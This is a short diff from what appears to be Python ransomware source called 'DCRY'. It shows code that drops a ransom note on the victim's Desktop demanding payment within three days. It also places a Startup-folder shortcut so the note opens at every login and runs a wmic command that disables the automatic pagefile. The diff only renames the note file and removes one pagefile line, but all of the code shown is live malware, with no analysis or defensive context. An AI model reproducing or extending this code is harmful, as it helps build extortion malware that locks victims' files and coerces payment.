@@ -499,7 +499,7 @@ To get them back, please follow the instructions below.
 - All your files will become permanently encrypted and unrecoverable if you don't pay within 3 days!!!
 
 Don't Cry, just pay =}}"""
-    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\README_DCRY.txt")
+    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\DCRY_README.txt")
     with open(file_path, "w") as f:
         f.write(msg)
     startup = winshell.startup()
@@ -509,7 +509,6 @@ Don't Cry, just pay =}}"""
     shortcut.TargetPath = "notepad.exe"
     shortcut.Arguments = file_path
     shortcut.save()
-    file_path = os.path.join(os.getenv("SystemDrive"), "pagefile.sys")
     execute_command(
         'wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False'
     )
